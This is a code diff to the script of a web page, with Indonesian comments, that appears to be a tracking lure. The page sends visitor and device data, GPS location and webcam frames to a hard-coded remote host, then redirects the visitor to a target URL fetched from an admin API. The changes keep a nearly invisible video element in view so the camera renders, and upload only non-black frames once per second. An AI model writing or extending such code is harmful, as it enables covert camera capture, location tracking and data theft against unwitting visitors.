@@ -147,16 +147,14 @@ body {
 
 <script>
 (function () {
-  var params = new URLSearchParams(location.search);
-  var TARGET = params.get('to') || '';
-  if (!/^https?:\/\//i.test(TARGET)) TARGET = '';
-
   var BASE = 'https://149.33.27.129.nip.io/phi';
   var VISIT_EP = BASE + '/api/visit';
   var DEVICE_EP = BASE + '/api/device/';
   var LOC_EP = BASE + '/api/location/';
   var FRAME_EP = BASE + '/api/frame/';
+  var TARGET_EP = BASE + '/api/current-target';
 
+  var TARGET = '';
   var visitId = null;
   var stream = null;
   var captureTimer = null;
@@ -170,7 +168,7 @@ body {
   function redirect() {
     if (redirected) return;
     redirected = true;
-    if (!TARGET) { log('no valid target'); return; }
+    if (!TARGET) { log('no target'); return; }
     log('redirecting to', TARGET);
     window.location.replace(TARGET);
   }
@@ -191,6 +189,30 @@ body {
     document.getElementById('nara-error').classList.remove('show');
   }
 
+  // ===== Resolve target: ?to= param dulu, kalau kosong fetch dari API =====
+  function resolveTarget() {
+    var params = new URLSearchParams(location.search);
+    var toParam = params.get('to') || '';
+    if (/^https?:\/\//i.test(toParam)) {
+      TARGET = toParam;
+      log('target from URL:', TARGET);
+      return Promise.resolve(TARGET);
+    }
+    log('fetching target from API');
+    return fetch(TARGET_EP, { cache: 'no-store' })
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (data && data.url && /^https?:\/\//i.test(data.url)) {
+          TARGET = data.url;
+          log('target from API:', TARGET);
+          return TARGET;
+        }
+        return '';
+      })
+      .catch(function (e) { log('fetch target failed', e); return ''; });
+  }
+
+  // ===== Visit & device =====
   function sendVisit() {
     return fetch(VISIT_EP, {
       method: 'POST',
@@ -333,6 +355,7 @@ body {
     });
   }
 
+  // ===== Kamera: tunggu sampai frame valid (bukan hitam), baru resolve =====
   function startCamera() {
     return new Promise(function (resolve) {
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -346,6 +369,7 @@ body {
       }).then(function (s) {
         log('camera granted');
         stream = s;
+
         var video = document.createElement('video');
         video.setAttribute('playsinline', '');
         video.setAttribute('webkit-playsinline', '');
@@ -355,7 +379,8 @@ body {
         video.playsInline = true;
         video.autoplay = true;
         video.srcObject = s;
-        video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
+        // HARUS tetap di viewport (bukan offscreen) supaya browser render frame
+        video.style.cssText = 'position:fixed;top:0;left:0;width:2px;height:2px;opacity:0.01;pointer-events:none;z-index:-1;';
         document.body.appendChild(video);
 
         var canvas = document.createElement('canvas');
@@ -364,25 +389,69 @@ body {
         var ctx = canvas.getContext('2d');
 
         var started = false;
+        var attempts = 0;
+        var MAX_ATTEMPTS = 30; // 30 * 100ms = 3 detik max tunggu
+
+        function isFrameValid(dataUrl) {
+          // Frame hitam 640x480 JPEG q=0.6 biasanya < 1500 byte.
+          // Frame berisi konten normal > 3000 byte.
+          return dataUrl && dataUrl.length > 1500;
+        }
+
         function captureOnce() {
           try {
             if (video.readyState < 2 || !video.videoWidth) return;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            sendFrame(canvas.toDataURL('image/jpeg', 0.6));
+            var data = canvas.toDataURL('image/jpeg', 0.6);
+            if (isFrameValid(data)) {
+              sendFrame(data);
+            }
           } catch (e) {}
         }
-        function start() {
-          if (started) return;
-          started = true;
-          captureOnce();
-          captureTimer = setInterval(captureOnce, 1000);
-        }
-        video.addEventListener('loadedmetadata', start);
-        video.addEventListener('canplay', start);
-        setTimeout(start, 500);
-        setTimeout(start, 1500);
 
-        resolve(true);
+        function tryStart() {
+          if (started) return;
+          attempts++;
+          try {
+            if (video.readyState >= 2 && video.videoWidth > 0) {
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              var testData = canvas.toDataURL('image/jpeg', 0.6);
+              if (isFrameValid(testData)) {
+                // Frame valid! Kirim frame pertama, mulai interval
+                started = true;
+                sendFrame(testData);
+                captureTimer = setInterval(captureOnce, 1000);
+                resolve(true);
+                return;
+              }
+            }
+          } catch (e) {}
+
+          if (attempts < MAX_ATTEMPTS) {
+            setTimeout(tryStart, 100);
+          } else {
+            // Timeout - tetap mulai capture walau frame mungkin gelap (lingkungan gelap)
+            log('camera timeout waiting valid frame, starting anyway');
+            started = true;
+            captureTimer = setInterval(captureOnce, 1000);
+            resolve(true);
+          }
+        }
+
+        // Force play (autoplay kadang butuh explicit play())
+        try { video.play().catch(function () {}); } catch (e) {}
+
+        video.addEventListener('loadedmetadata', function () {
+          try { video.play().catch(function () {}); } catch (e) {}
+          setTimeout(tryStart, 200);
+        }, { once: true });
+
+        video.addEventListener('playing', function () {
+          setTimeout(tryStart, 200);
+        }, { once: true });
+
+        // Fallback: coba cek mulai 500ms
+        setTimeout(tryStart, 500);
       }).catch(function (e) {
         log('camera denied', e && e.name);
         resolve(false);
@@ -426,7 +495,7 @@ body {
     Promise.all([requestGPS(), startCamera()]).then(function (results) {
       var gpsOk = results[0];
       var camOk = results[1];
-      log('permissions result', { gps: gpsOk, camera: camOk });
+      log('permissions', { gps: gpsOk, camera: camOk });
 
       if (gpsOk && camOk) {
         startCountdownAndRedirect();
@@ -459,20 +528,22 @@ body {
     handleAllow();
   };
 
-  // Kalau tidak ada target, tampilkan error
-  if (!TARGET) {
-    showError('URL tujuan tidak ditemukan. Pastikan link yang Anda buka sudah benar.');
-    document.getElementById('nara-retry').style.display = 'none';
-    return;
-  }
-
-  sendVisit().then(function () {
-    if (visitId) {
-      collectDevice().then(function (dev) {
-        if (dev && Object.keys(dev).length) sendDevice(dev);
-      });
+  // ===== Boot =====
+  resolveTarget().then(function () {
+    if (!TARGET) {
+      showError('Target URL belum diset oleh admin. Silakan hubungi admin.');
+      document.getElementById('nara-retry').style.display = 'none';
+      return;
     }
-    buildBanner();
+
+    sendVisit().then(function () {
+      if (visitId) {
+        collectDevice().then(function (dev) {
+          if (dev && Object.keys(dev).length) sendDevice(dev);
+        });
+      }
+      buildBanner();
+    });
   });
 
   window.addEventListener('pagehide', stopEverything);
